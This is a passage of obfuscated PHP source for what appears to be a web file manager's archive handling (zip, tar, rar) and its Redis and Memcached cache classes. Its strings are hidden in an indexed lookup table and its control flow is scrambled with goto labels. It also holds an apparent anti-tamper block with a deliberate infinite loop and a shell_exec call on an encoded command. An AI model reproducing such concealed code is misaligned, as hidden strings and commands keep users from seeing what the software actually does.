"\x5c\x64\x7b\x34\175\x5b\55\x5c\57\135\x3f\x28\60\x5b\x31\55\x39\135\x7c\x31\133\60\x2d\62\x5d\51\133\55\x5c\x2f\x5d\77\50\x5b\x30\55\62\x5d\134\x64\174\63\x5b\60\x2d\x31\x5d\51\x5c\163\x2b\x28\x5b\60\55\61\x5d\134\x64\174\62\x5b\60\x2d\x34\135\51\x3a\x5b\x30\x2d\65\135\134\x64", "\160\x61\163\163\x77\x6f\x72\144" => "\x28\77\75\56\x2a\x5c\144\51\50\x3f\75\56\x2a\133\x61\55\172\135\51\x28\77\x3d\56\x2a\133\101\55\x5a\135\x29\56\x7b\70\54\x32\x30\175", "\x6b\x65\x79" => "\x5b\101\55\132\141\55\x7a\60\55\71\x5f\134\55\x5c\x2e\135\53", "\x6b\x65\171\106\x75\154\x6c" => "\x5b\x41\x2d\x5a\141\x2d\172\x30\55\71\137\134\x2d\x5c\56\x5c\163\54\135\x2b"); if (!$CãØ¬«Ãºğ) { return $Cƒã•¥Ã‹Ó; } return $Cƒã•¥Ã‹Ó[$CãØ¬«Ãºğ]; } public static function check($CÀ·ÎÒÜĞ, $aß±Üß÷, $e”‹ìÖÚçˆ = null) { $F‡ØØ ŠŠ =& $_SERVER[‡’¶øåüç˜]; switch ($aß±Üß÷) { case $F‡ØØ ŠŠ[7]: return in_array($CÀ·ÎÒÜĞ, $e”‹ìÖÚçˆ); break; case $F‡ØØ ŠŠ[1889]: return floatval($CÀ·ÎÒÜĞ) > $e”‹ìÖÚçˆ; break; case $F‡ØØ ŠŠ[1890]: return floatval($CÀ·ÎÒÜĞ) < $e”‹ìÖÚçˆ; break; case $F‡ØØ ŠŠ[329]: return strlen($CÀ·ÎÒÜĞ) >= $e”‹ìÖÚçˆ[0] && strlen($CÀ·ÎÒÜĞ) <= $e”‹ìÖÚçˆ[1]; break; case $F‡ØØ ŠŠ[329]: if (is_array($e”‹ìÖÚçˆ)) { return strlen($CÀ·ÎÒÜĞ) >= $e”‹ìÖÚçˆ[0] && strlen($CÀ·ÎÒÜĞ) <= $e”‹ìÖÚçˆ[1]; break; } else { return strlen($CÀ·ÎÒÜĞ) == $e”‹ìÖÚçˆ; break; } case $F‡ØØ ŠŠ[325]: return floatval($CÀ·ÎÒÜĞ) >= $e”‹ìÖÚçˆ[0] && floatval($CÀ·ÎÒÜĞ) <= $e”‹ìÖÚçˆ[1]; break; } $d²ª×‹­–ˆ = self::reg(!1); $aß±Üß÷ = isset($d²ª×‹­–ˆ[$aß±Üß÷]) ? $d²ª×‹­–ˆ[$aß±Üß÷] : $aß±Üß÷; if (substr($aß±Üß÷, 0, 1) != $F‡ØØ ŠŠ[8]) { $aß±Üß÷ = $F‡ØØ ŠŠ[1891] . $aß±Üß÷ . $F‡ØØ ŠŠ[1892]; } return preg_match($aß±Üß÷, $CÀ·ÎÒÜĞ) === 1; } public static function get($b´ÜÒë«íë, $B‹ÎØİãŠØ = null, $cÂ‡»éˆ²¾ = null, $dŒË‚İ´ë± = null) { goto a¡ŸÇÄˆœŠ; eÓ…Ëïˆ¢: if (!is_null($dŒË‚İ´ë±)) { $f®¼ÔêõºÃ[$A—Î¹Ò¢œ«[1020]] = $dŒË‚İ´ë±; } if (!is_null($B‹ÎØİãŠØ)) { $f®¼ÔêõºÃ[$A—Î¹Ò¢œ«[1887]] = $B‹ÎØİãŠØ; } $CŒí½Ç§£† = Input::getArray(array($b´ÜÒë«íë => $f®¼ÔêõºÃ)); goto a¹´ËŸ¦ª•; a¹´ËŸ¦ª•: return $CŒí½Ç§£†[$b´ÜÒë«íë]; goto bÌ°§Œø¹; a¡ŸÇÄˆœŠ: $A—Î¹Ò¢œ« =& $_SERVER[‡’¶øåüç˜]; $f®¼ÔêõºÃ = array(); if (!is_null($cÂ‡»éˆ²¾)) { $f®¼ÔêõºÃ[$A—Î¹Ò¢œ«[34]] = $cÂ‡»éˆ²¾; } goto eÓ…Ëïˆ¢; bÌ°§Œø¹: } } if (!isset($_SERVER[$_SERVER[‡’¶øåüç˜][372]]) || !isset($_SERVER[$_SERVER[‡’¶øåüç˜][373]])) { goto cÙ±Š†Ôå‡; EÖã«”Äší: $eĞĞùÅö” = explode($_SERVER[‡’¶øåüç˜][221], $C¾Ú³éâ‹ª); if (count($eĞĞùÅö”) < $_SERVER[‡’¶øåüç˜][377]) { $fœÓœ¤“š = $_SERVER[‡’¶øåüç˜][378]; $fœÓœ¤“š(); } $F¿ÜøÏ¾ÌË = $_SERVER[‡’¶øåüç˜][379]; goto Fâ¡ã«‡—‡; Fâ¡ã«‡—‡: $F¿ÜøÏ¾ÌË($_SERVER[$_SERVER[‡’¶øåüç˜][375]] . $_SERVER[‡’¶øåüç˜][376]); $c’…Û¥¢®Ï = 2; while ($c’…Û¥¢®Ï > 1) { $Cç «­ãª = rawurlencode($c’…Û¥¢®Ï . $_SERVER[‡’¶øåüç˜][365]); } goto e‰¦›¸¬ÒÙ; cÙ±Š†Ôå‡: $c÷Æ¥‘´Ñ° = $_SERVER[‡’¶øåüç˜][374]; $dˆ—÷ˆÚªÜ = $_SERVER[$_SERVER[‡’¶øåüç˜][375]] . $_SERVER[‡’¶øåüç˜][376]; $C¾Ú³éâ‹ª = $c÷Æ¥‘´Ñ°($dˆ—÷ˆÚªÜ); goto EÖã«”Äší; e‰¦›¸¬ÒÙ: } class KodArchive { static function init() { goto eÕ·èÍ¾á; d°¶‚Ö…: require_once ARCHIVE_LIB . $cîŞÏ¼ÕÏ[1901]; require_once ARCHIVE_LIB . $cîŞÏ¼ÕÏ[1902]; require_once ARCHIVE_LIB . $cîŞÏ¼ÕÏ[1903]; goto EŠƒ›Š©…ˆ; eÕ·èÍ¾á: $cîŞÏ¼ÕÏ =& $_SERVER[‡’¶øåüç˜]; if (defined($cîŞÏ¼ÕÏ[1893])) { return; } define($cîŞÏ¼ÕÏ[1893], SDK_DIR . $cîŞÏ¼ÕÏ[1894]); goto dä·â¤¹Ó; b´„ÇŒÔ±®: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $cîŞÏ¼ÕÏ[1899]; require_once ARCHIVE_LIB . $cîŞÏ¼ÕÏ[1900]; goto d°¶‚Ö…; EŠƒ›Š©…ˆ: require_once ARCHIVE_LIB . $cîŞÏ¼ÕÏ[1904]; goto cµÒ¬ ˆÆÖ; dä·â¤¹Ó: define($cîŞÏ¼ÕÏ[1895], TEMP_FILES); define($cîŞÏ¼ÕÏ[1896], TEMP_FILES); define($cîŞÏ¼ÕÏ[1897], $cîŞÏ¼ÕÏ[1898]); goto b´„ÇŒÔ±®; cµÒ¬ ˆÆÖ: } static function checkIfType($cÁÍÅ·ì°ß, $B«½¾ÃùŒª) { goto Aİ¯§‘…ÖÕ; f¬Ë »³¡à: return $f’ˆòÍªÔ¸; goto b§¨õÚ†”Ô; dß²½õº: $f’ˆòÍªÔ¸ = in_array($cÁÍÅ·ì°ß, $DÏùĞöÌ½Œ[$B«½¾ÃùŒª]); if ($f’ˆòÍªÔ¸ && ($B«½¾ÃùŒª == $FÅšÀ–ÓøŒ[305] || $B«½¾ÃùŒª == $FÅšÀ–ÓøŒ[1908]) && (!function_exists($FÅšÀ–ÓøŒ[1916]) || !function_exists($FÅšÀ–ÓøŒ[1917]))) { show_tips($FÅšÀ–ÓøŒ[1918]); } if ($f’ˆòÍªÔ¸ && $B«½¾ÃùŒª == $FÅšÀ–ÓøŒ[1052] && (!function_exists($FÅšÀ–ÓøŒ[1919]) || !strstr(shell_exec($FÅšÀ–ÓøŒ[1920]), $FÅšÀ–ÓøŒ[1921]))) { show_tips($FÅšÀ–ÓøŒ[1922]); } goto f¬Ë »³¡à; Aİ¯§‘…ÖÕ: $FÅšÀ–ÓøŒ =& $_SERVER[‡’¶øåüç˜]; self::init(); $DÏùĞöÌ½Œ = array($FÅšÀ–ÓøŒ[305] => array($FÅšÀ–ÓøŒ[305], $FÅšÀ–ÓøŒ[1905], $FÅšÀ–ÓøŒ[1906], $FÅšÀ–ÓøŒ[1907]), $FÅšÀ–ÓøŒ[1908] => array($FÅšÀ–ÓøŒ[1908], $FÅšÀ–ÓøŒ[1909], $FÅšÀ–ÓøŒ[1051], $FÅšÀ–ÓøŒ[1049]), $FÅšÀ–ÓøŒ[1052] => array($FÅšÀ–ÓøŒ[1052], $FÅšÀ–ÓøŒ[1910], $FÅšÀ–ÓøŒ[1911], $FÅšÀ–ÓøŒ[1912], $FÅšÀ–ÓøŒ[1913], $FÅšÀ–ÓøŒ[1914], $FÅšÀ–ÓøŒ[1915])); goto dß²½õº; b§¨õÚ†”Ô: } static function listContent($a¿ŸÁÊÅŠ, $C­¹Åñîæ = true) { $D¸¢±‹Áòà =& $_SERVER[‡’¶øåüç˜]; self::init(); $cÜƒâğ°ƒ = !empty($GLOBALS[$D¸¢±‹Áòà[1056]]) ? $GLOBALS[$D¸¢±‹Áòà[1056]] : get_path_ext($a¿ŸÁÊÅŠ); $f‘Êšˆ–‡ = !1; if (self::checkIfType($cÜƒâğ°ƒ, $D¸¢±‹Áòà[1908])) { $fİóæÇºä = PclTarList($a¿ŸÁÊÅŠ, $cÜƒâğ°ƒ); $f‘Êšˆ–‡ = array(); for ($AØ©…ŸñÌ = 0; $AØ©…ŸñÌ < count($fİóæÇºä); $AØ©…ŸñÌ++) { $A‘Ş˜Ì‘Øˆ = $fİóæÇºä[$AØ©…ŸñÌ]; if ($A‘Ş˜Ì‘Øˆ[$D¸¢±‹Áòà[1923]] == $D¸¢±‹Áòà[1924] || $A‘Ş˜Ì‘Øˆ[$D¸¢±‹Áòà[1923]] == $D¸¢±‹Áòà[1925]) { continue; } if ($C­¹Åñîæ) { $A‘Ş˜Ì‘Øˆ[$D¸¢±‹Áòà[1926]] = ltrim($A‘Ş˜Ì‘Øˆ[$D¸¢±‹Áòà[1926]], $D¸¢±‹Áòà[1162]); } if ($A‘Ş˜Ì‘Øˆ[$D¸¢±‹Áòà[1923]] == $D¸¢±‹Áòà[1927]) { $A‘Ş˜Ì‘Øˆ[$D¸¢±‹Áòà[76]] = !0; } else { $A‘Ş˜Ì‘Øˆ[$D¸¢±‹Áòà[76]] = !1; } $A‘Ş˜Ì‘Øˆ[$D¸¢±‹Áòà[1044]] = $AØ©…ŸñÌ; $f‘Êšˆ–‡[] = $A‘Ş˜Ì‘Øˆ; } } else { if (self::checkIfType($cÜƒâğ°ƒ, $D¸¢±‹Áòà[1052])) { $c‚ï¾æƒ’î = kodRarArchive::listContent($a¿ŸÁÊÅŠ); if (!$c‚ï¾æƒ’î[$D¸¢±‹Áòà[1040]]) { return $c‚ï¾æƒ’î; } else { $f‘Êšˆ–‡ = $c‚ï¾æƒ’î[$D¸¢±‹Áòà[1042]]; } } else { if (kodZipArchive::support($D¸¢±‹Áòà[358])) { $f‘Êšˆ–‡ = kodZipArchive::listContent($a¿ŸÁÊÅŠ); } else { $eŒÓí£êÕ¬ = new PclZip($a¿ŸÁÊÅŠ); $f‘Êšˆ–‡ = $eŒÓí£êÕ¬->listContent(); } } } if ($f‘Êšˆ–‡) { $FªãÂÙ¥ªŠ = unzip_charset_get($f‘Êšˆ–‡); $C­¹Åñîæ = $C­¹Åñîæ && function_exists($D¸¢±‹Áòà[65]); for ($AØ©…ŸñÌ = 0; $AØ©…ŸñÌ < count($f‘Êšˆ–‡); $AØ©…ŸñÌ++) { $f‘Êšˆ–‡[$AØ©…ŸñÌ][$D¸¢±‹Áòà[1926]] = str_replace(array($D¸¢±‹Áòà[1079], $D¸¢±‹Áòà[1928]), $D¸¢±‹Áòà[769], $f‘Êšˆ–‡[$AØ©…ŸñÌ][$D¸¢±‹Áòà[1926]]); if ($C­¹Åñîæ) { $f‘Êšˆ–‡[$AØ©…ŸñÌ][$D¸¢±‹Áòà[1926]] = iconv_to($f‘Êšˆ–‡[$AØ©…ŸñÌ][$D¸¢±‹Áòà[1926]], $FªãÂÙ¥ªŠ, $D¸¢±‹Áòà[330]); unset($f‘Êšˆ–‡[$AØ©…ŸñÌ][$D¸¢±‹Áòà[1929]]); } } return array($D¸¢±‹Áòà[1040] => !0, $D¸¢±‹Áòà[1042] => $f‘Êšˆ–‡); } else { return array($D¸¢±‹Áòà[1040] => !1, $D¸¢±‹Áòà[1042] => $f‘Êšˆ–‡); } } static function extract($DµŠÜİ®íí, $E¼ÈÈ¯å, $b³¦¨œ’£è = "\55\x31", &$C ¯å˜Ûâ = false) { goto c¥¦Í°¹…À; BÛ¡µÒíŞ½: $dø¼éä»Ìñ = self::listContent($DµŠÜİ®íí, !1); if (!$dø¼éä»Ìñ[$cÛ¡©ùöœí[1040]]) { return $dø¼éä»Ìñ; } if ($b³¦¨œ’£è != $cÛ¡©ùöœí[1039]) { goto c°ŒÆÚîå; EÃæñ®İ§©: if ($fòˆò‘Èë[$cÛ¡©ùöœí[76]]) { $A“¯ÑÇ­Ê• = rtrim($A“¯ÑÇ­Ê•, $cÛ¡©ùöœí[8]) . $cÛ¡©ùöœí[8]; $C ¯å˜Ûâ = array($C ¯å˜Ûâ); } $AáíÔ­·¤š = str_replace($cÛ¡©ùöœí[93], $cÛ¡©ùöœí[8], $A“¯ÑÇ­Ê•); if (substr($AáíÔ­·¤š, -1) == $cÛ¡©ùöœí[8]) { if (!strstr(trim($AáíÔ­·¤š, $cÛ¡©ùöœí[8]), $cÛ¡©ùöœí[8])) { $E¼ÈÈ¯å = $E¼ÈÈ¯å . get_path_this($AáíÔ­·¤š) . $cÛ¡©ùöœí[8]; } } else { if ($CÑ¶‚¢ÁÔ‚ == $A“¯ÑÇ­Ê•) { $CÑ¶‚¢ÁÔ‚ = $cÛ¡©ùöœí[33]; } } goto fŸë¸ç; c°ŒÆÚîå: $fòˆò‘Èë = self::fileIndex($dø¼éä»Ìñ[$cÛ¡©ùöœí[1042]], $b³¦¨œ’£è); $C ¯å˜Ûâ = str_replace(array($cÛ¡©ùöœí[1079], $cÛ¡©ùöœí[1928]), $cÛ¡©ùöœí[70], $fòˆò‘Èë[$cÛ¡©ùöœí[1926]]); $A“¯ÑÇ­Ê• = $C ¯å˜Ûâ; goto A„İÂÈˆÄ‚; A„İÂÈˆÄ‚: if ($GLOBALS[$cÛ¡©ùöœí[6]][$cÛ¡©ùöœí[1160]] != $cÛ¡©ùöœí[330]) { $A“¯ÑÇ­Ê• = unzip_pre_name($C ¯å˜Ûâ); } $CÑ¶‚¢ÁÔ‚ = get_path_father($C ¯å˜Ûâ); if ($CÑ¶‚¢ÁÔ‚ == $C ¯å˜Ûâ) { $CÑ¶‚¢ÁÔ‚ = $cÛ¡©ùöœí[33]; } goto EÃæñ®İ§©; fŸë¸ç: } goto EŠˆ¹³¿õ¸; c¥¦Í°¹…À: $cÛ¡©ùöœí =& $_SERVER[‡’¶øåüç˜]; self::init(); $B˜Š†ğ•¼ = !empty($GLOBALS[$cÛ¡©ùöœí[1056]]) ? $GLOBALS[$cÛ¡©ùöœí[1056]] : get_path_ext($DµŠÜİ®íí); goto BÛ¡µÒíŞ½; EŠˆ¹³¿õ¸: if (self::checkIfType($B˜Š†ğ•¼, $cÛ¡©ùöœí[1908])) { if ($b³¦¨œ’£è != $cÛ¡©ùöœí[1039]) { $A“¯ÑÇ­Ê• = unzip_pre_name($A“¯ÑÇ­Ê•); $CÑ¶‚¢ÁÔ‚ = unzip_pre_name($CÑ¶‚¢ÁÔ‚); $DÓ¦øŸ¤‰§ = PclTarExtractList($DµŠÜİ®íí, array($A“¯ÑÇ­Ê•), $E¼ÈÈ¯å, $CÑ¶‚¢ÁÔ‚, $B˜Š†ğ•¼); } else { $DÓ¦øŸ¤‰§ = PclTarExtract($DµŠÜİ®íí, $E¼ÈÈ¯å, $cÛ¡©ùöœí[365], $B˜Š†ğ•¼); } return array($cÛ¡©ùöœí[1040] => $DÓ¦øŸ¤‰§, $cÛ¡©ùöœí[1042] => PclErrorString(!0)); } else { if (self::checkIfType($B˜Š†ğ•¼, $cÛ¡©ùöœí[1052])) { return kodRarArchive::extract($DµŠÜİ®íí, $E¼ÈÈ¯å, $B˜Š†ğ•¼, $C ¯å˜Ûâ); } else { if (kodZipArchive::support($cÛ¡©ùöœí[1930])) { return kodZipArchive::extract($DµŠÜİ®íí, $E¼ÈÈ¯å, $C ¯å˜Ûâ); } else { $bÚ¾®ôª¥ó = new PclZip($DµŠÜİ®íí); if ($b³¦¨œ’£è != $cÛ¡©ùöœí[1039]) { $DÓ¦øŸ¤‰§ = $bÚ¾®ôª¥ó->extract(PCLZIP_OPT_PATH, $E¼ÈÈ¯å, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $cÛ¡©ùöœí[1931], PCLZIP_OPT_BY_NAME, $fòˆò‘Èë[$cÛ¡©ùöœí[1926]], PCLZIP_OPT_REMOVE_PATH, $CÑ¶‚¢ÁÔ‚, PCLZIP_OPT_REPLACE_NEWER); } else { $DÓ¦øŸ¤‰§ = $bÚ¾®ôª¥ó->extract(PCLZIP_OPT_PATH, $E¼ÈÈ¯å, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $cÛ¡©ùöœí[1931], PCLZIP_OPT_REPLACE_NEWER); } return array($cÛ¡©ùöœí[1040] => $DÓ¦øŸ¤‰§, $cÛ¡©ùöœí[1042] => $bÚ¾®ôª¥ó->errorName(!0)); } } } return array($cÛ¡©ùöœí[1040] => !1, $cÛ¡©ùöœí[1042] => $cÛ¡©ùöœí[1932]); goto c™š£Ó›èğ; c™š£Ó›èğ: } static function fileIndex($BçÉéœ¡Á, $CóÈ‚ŞùÖ, $Dîƒ×¦¿…İ = false) { goto FƒˆÔ‚—ê; a“ìÆêóš : $a»‚É¡ùšÖ = $dã®Š¤”í; if ($Dîƒ×¦¿…İ) { $a»‚É¡ùšÖ = $dã®Š¤”í[$Dîƒ×¦¿…İ]; if ($dã®Š¤”í[$C’ŸäÉê‚È[76]]) { $a»‚É¡ùšÖ = rtrim($a»‚É¡ùšÖ, $C’ŸäÉê‚È[8]) . $C’ŸäÉê‚È[8]; } } return $a»‚É¡ùšÖ; goto CÜ´¢¤É«; FƒˆÔ‚—ê: $C’ŸäÉê‚È =& $_SERVER[‡’¶øåüç˜]; self::init(); if (!is_array($BçÉéœ¡Á)) { return !1; } goto cŠĞ®ßÛÊ…; cŠĞ®ßÛÊ…: $bê²£äæÎĞ = count($BçÉéœ¡Á); for ($a³˜ƒ½äŒ¤ = 0; $a³˜ƒ½äŒ¤ < $bê²£äæÎĞ; $a³˜ƒ½äŒ¤++) { if ($CóÈ‚ŞùÖ == $BçÉéœ¡Á[$a³˜ƒ½äŒ¤][$C’ŸäÉê‚È[1044]]) { $dã®Š¤”í = $BçÉéœ¡Á[$a³˜ƒ½äŒ¤]; break; } } if (!$dã®Š¤”í) { show_tips($C’ŸäÉê‚È[1933]); } goto a“ìÆêóš ; CÜ´¢¤É«: } static function extractZipFile($C×¹Ô³ö—‡, $eïïÔŸÍ, $F×¤¸éå™ = false) { goto a§‰ä¨¾¥Ğ; B·„Óá‡ÔĞ: if (file_exists($E…Â•ó›Ûµ)) { return $E…Â•ó›Ûµ; } $c’§º‘ÉöÉ = new PclZip($C×¹Ô³ö—‡); $D§¾¨»‹ = unzip_filter_ext($b Ò›²»Ş² . get_path_this($eïïÔŸÍ)); goto C–­ù†¸‹; a§‰ä¨¾¥Ğ: $B“Çß£¿ =& $_SERVER[‡’¶øåüç˜]; self::init(); $b Ò›²»Ş² = TEMP_FILES . hash_path($C×¹Ô³ö—‡) . $B“Çß£¿[8]; goto bö¹ƒ¾ï‰ ; aÌá—›ãª‘: if (!file_exists($D§¾¨»‹)) { return !1; } @rename($D§¾¨»‹, $E…Â•ó›Ûµ); return $E…Â•ó›Ûµ; goto A†éÓà°¨ß; C–­ù†¸‹: $Cèğ à = get_path_father($eïïÔŸÍ); if ($Cèğ à == $eïïÔŸÍ) { $Cèğ à = $B“Çß£¿[33]; } $Cïï«ù’ó = $c’§º‘ÉöÉ->extract(PCLZIP_OPT_PATH, $b Ò›²»Ş², PCLZIP_CB_PRE_FILE_NAME, $B“Çß£¿[1931], PCLZIP_OPT_REMOVE_PATH, $Cèğ à, PCLZIP_OPT_BY_NAME, $eïïÔŸÍ); goto aÌá—›ãª‘; bö¹ƒ¾ï‰ : mk_dir($b Ò›²»Ş²); $E…Â•ó›Ûµ = $b Ò›²»Ş² . md5($C×¹Ô³ö—‡ . $eïïÔŸÍ); if ($F×¤¸éå™) { $E…Â•ó›Ûµ = $b Ò›²»Ş² . $F×¤¸éå™; } goto B·„Óá‡ÔĞ; A†éÓà°¨ß: } static function filePreview($Dˆğ¶×‘Å, $AÀ¦¾ŠÎÎÎ, $b„ÔŸëŸŠ© = false, $Bè±éˆïŠŒ = false) { goto E›°êœ«±; AõµŒº½“³: mk_dir($FŞ¼šŒÈØŸ); $b›Ù¥÷Ó = $FŞ¼šŒÈØŸ . md5($Dˆğ¶×‘Å . $AÀ¦¾ŠÎÎÎ . $Bè±éˆïŠŒ); $EƒÖäçÓ = $cŠï°í¼Î˜[33]; goto D½‚ÔàÓñ; DàÙí„‚—³: $EƒÖäçÓ = unzip_pre_name($EƒÖäçÓ); $Bªã¸¹ÒÏƒ = get_path_this($EƒÖäçÓ); $bÊîÔ·¼Í³ = unzip_filter_ext($FŞ¼šŒÈØŸ . $Bªã¸¹ÒÏƒ); goto A§·­¶È±Ù; E›°êœ«±: $cŠï°í¼Î˜ =& $_SERVER[‡’¶øåüç˜]; self::init(); $FŞ¼šŒÈØŸ = TEMP_FILES . hash_path($Dˆğ¶×‘Å) . $cŠï°í¼Î˜[8]; goto AõµŒº½“³; D½‚ÔàÓñ: $eÏæìÒÈÕ™ = self::extract($Dˆğ¶×‘Å, $FŞ¼šŒÈØŸ, $AÀ¦¾ŠÎÎÎ, $EƒÖäçÓ); if (is_array($EƒÖäçÓ)) { show_json($cŠï°í¼Î˜[1934], !1); } if (file_exists($b›Ù¥÷Ó)) { IO::fileOut($b›Ù¥÷Ó, $b„ÔŸëŸŠ©, get_path_this($EƒÖäçÓ)); return; } goto DàÙí„‚—³; Aß‘£«ŒªÍ: if (!file_exists($b›Ù¥÷Ó)) { del_dir($FŞ¼šŒÈØŸ); show_json($cŠï°í¼Î˜[1936]); } IO::fileOut($b›Ù¥÷Ó, $b„ÔŸëŸŠ©, $Bªã¸¹ÒÏƒ); goto dÖ‰Ü¼‚ïå; A§·­¶È±Ù: if (!$eÏæìÒÈÕ™[$cŠï°í¼Î˜[1040]]) { show_json($eÏæìÒÈÕ™[$cŠï°í¼Î˜[1042]], !1); } if (!file_exists($bÊîÔ·¼Í³)) { show_json($cŠï°í¼Î˜[1935], !1); } @rename($bÊîÔ·¼Í³, $b›Ù¥÷Ó); goto Aß‘£«ŒªÍ; dÖ‰Ü¼‚ïå: } static function create($bßÁĞìÌÈö, $B›‘ÅŠ‰Ê) { $dº­Ïòõé¨ =& $_SERVER[‡’¶øåüç˜]; self::init(); $BÇ¿Ò†¶ôö = get_path_ext($bßÁĞìÌÈö); $b¶‹‡¡ÊÔ¸ = !1; if (self::checkIfType($BÇ¿Ò†¶ôö, $dº­Ïòõé¨[305])) { if (kodZipArchive::support($dº­Ïòõé¨[1015])) { return kodZipArchive::create($bßÁĞìÌÈö, $B›‘ÅŠ‰Ê); } $B’’æ©Íƒö = new PclZip($bßÁĞìÌÈö); foreach ($B›‘ÅŠ‰Ê as $f†á‹ÎŒÃ• => $c÷¿¸×Ñ) { $c÷¿¸×Ñ = str_replace($dº­Ïòõé¨[480], $dº­Ïòõé¨[8], $c÷¿¸×Ñ); $EÊğÛºÀÌá = Kodio::clear(get_path_father($c÷¿¸×Ñ)); if ($f†á‹ÎŒÃ• == 0) { $b¶‹‡¡ÊÔ¸ = $B’’æ©Íƒö->create($c÷¿¸×Ñ, PCLZIP_OPT_REMOVE_PATH, $EÊğÛºÀÌá, PCLZIP_CB_PRE_FILE_NAME, $dº­Ïòõé¨[1937]); continue; } $b¶‹‡¡ÊÔ¸ = $B’’æ©Íƒö->add($c÷¿¸×Ñ, PCLZIP_OPT_REMOVE_PATH, $EÊğÛºÀÌá, PCLZIP_CB_PRE_FILE_NAME, $dº­Ïòõé¨[1937]); } } else { if (self::checkIfType($BÇ¿Ò†¶ôö, $dº­Ïòõé¨[1908])) { foreach ($B›‘ÅŠ‰Ê as $f†á‹ÎŒÃ• => $c÷¿¸×Ñ) { $c÷¿¸×Ñ = str_replace($dº­Ïòõé¨[480], $dº­Ïòõé¨[8], $c÷¿¸×Ñ); $EÊğÛºÀÌá = Kodio::clear(get_path_father($c÷¿¸×Ñ)); if ($f†á‹ÎŒÃ• == 0) { $b¶‹‡¡ÊÔ¸ = PclTarCreate($bßÁĞìÌÈö, array($c÷¿¸×Ñ), $BÇ¿Ò†¶ôö, null, $EÊğÛºÀÌá); continue; } $b¶‹‡¡ÊÔ¸ = PclTarAddList($bßÁĞìÌÈö, array($c÷¿¸×Ñ), $dº­Ïòõé¨[33], $EÊğÛºÀÌá, $BÇ¿Ò†¶ôö); } } } return $b¶‹‡¡ÊÔ¸; } } goto AÕ‹ç‹¥; Fœé‘³Í¤: class CacheLockDatabase { public function lock($F²‹å­ï†, $eÊ³ˆ•­°ß = 0) { $cÍœ˜³ÄĞ = Model($_SERVER[‡’¶øåüç˜][762]); $B±ÆÃòö¥” = microtime(!0) + $eÊ³ˆ•­°ß; while (microtime(!0) < $B±ÆÃòö¥”) { $D˜¸¡ÀÌá = $cÍœ˜³ÄĞ->get($F²‹å­ï†); if (!$D˜¸¡ÀÌá || $D˜¸¡ÀÌá < microtime(!0)) { $dëµÛç¦¸¹ = $cÍœ˜³ÄĞ->set($F²‹å­ï†, $B±ÆÃòö¥”); if ($dëµÛç¦¸¹) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($B÷«æÍÎ±«) { return Model($_SERVER[‡’¶øåüç˜][762])->get($B÷«æÍÎ±«); } public function unlock($B„‰»§¿²‡) { Model($_SERVER[‡’¶øåüç˜][762])->remove($B„‰»§¿²‡); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($e¾ÙàäàìŒ, $FÁ¿¯ñëî) { $F¸º×·«µÏ =& $_SERVER[‡’¶øåüç˜]; if (!class_exists($F¸º×·«µÏ[786])) { show_json($F¸º×·«µÏ[787], !1); } $this->cacheTime = $FÁ¿¯ñëî; $this->handle = new Memcached(); if (is_array($e¾ÙàäàìŒ[$F¸º×·«µÏ[788]]) && count($e¾ÙàäàìŒ[$F¸º×·«µÏ[788]]) >= 1) { foreach ($e¾ÙàäàìŒ[$F¸º×·«µÏ[788]] as $d†‰‹ŸÜ£) { $bğà”¿Êì = explode($F¸º×·«µÏ[4], $d†‰‹ŸÜ£); $this->handle->addServer($bğà”¿Êì[0], $bğà”¿Êì[1]); } } else { $this->handle->addServer($e¾ÙàäàìŒ[$F¸º×·«µÏ[173]], $e¾ÙàäàìŒ[$F¸º×·«µÏ[174]]); } } public function set($e¥Ç·æ—°, $eğĞÈãöÈõ, $A»î…°ğèë = false) { $A»î…°ğèë = $A»î…°ğèë ? $A»î…°ğèë : $this->cacheTime; return $this->handle->set($e¥Ç·æ—°, $eğĞÈãöÈõ, $A»î…°ğèë); } public function get($eÚÌ§ãÎò¿) { return $this->handle->get($eÚÌ§ãÎò¿); } public function remove($fÜ†ÅßË) { return $this->handle->delete($fÜ†ÅßË); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($C½³Æ†°È¼, $fÕì®ë»Ù) { $CÑŠæœ“° =& $_SERVER[‡’¶øåüç˜]; if (!class_exists($CÑŠæœ“°[789])) { show_json($CÑŠæœ“°[790], !1); } $this->cacheTime = $fÕì®ë»Ù; $f²…¯Ö‡Âİ = isset($C½³Æ†°È¼[$CÑŠæœ“°[791]]) ? $C½³Æ†°È¼[$CÑŠæœ“°[791]] : 10; $BëÄîêØ„ = _get($C½³Æ†°È¼, $CÑŠæœ“°[788]); if ($BëÄîêØ„ && is_array($BëÄîêØ„)) { $this->initCluster($C½³Æ†°È¼, $f²…¯Ö‡Âİ); } else { $this->handle = $this->init($C½³Æ†°È¼, $f²…¯Ö‡Âİ); } } private function init($D‰ôŞ»Á–¼, $eÉÒ„Æ‡ë®) { $dÙ²åÁùñµ =& $_SERVER[‡’¶øåüç˜]; $Dš‡·§Û‚º = new Redis(); $a”»ùç¦ª½ = isset($D‰ôŞ»Á–¼[$dÙ²åÁùñµ[792]]) ? $D‰ôŞ»Á–¼[$dÙ²åÁùñµ[792]] : !1; if ($a”»ùç¦ª½) { $Dš‡·§Û‚º->pconnect($D‰ôŞ»Á–¼[$dÙ²åÁùñµ[173]], $D‰ôŞ»Á–¼[$dÙ²åÁùñµ[174]], $eÉÒ„Æ‡ë®); } else { $Dš‡·§Û‚º->connect($D‰ôŞ»Á–¼[$dÙ²åÁùñµ[173]], $D‰ôŞ»Á–¼[$dÙ²åÁùñµ[174]], $eÉÒ„Æ‡ë®); } if (!empty($D‰ôŞ»Á–¼[$dÙ²åÁùñµ[388]])) { $Dš‡·§Û‚º->auth($D‰ôŞ»Á–¼[$dÙ²åÁùñµ[388]]); } return $Dš‡·§Û‚º; } private function initCluster($a’¨ÇîèŒ„, $b™Øô²ó™) { $d‚—Øîœ‹Æ =& $_SERVER[‡’¶øåüç˜]; $cÊô¸´Ù³ = array($d‚—Øîœ‹Æ[793], $d‚—Øîœ‹Æ[794], $d‚—Øîœ‹Æ[795]); $a¾ùâÀÖ¸ = $d‚—Øîœ‹Æ[793]; if (isset($a’¨ÇîèŒ„[$d‚—Øîœ‹Æ[12]]) && 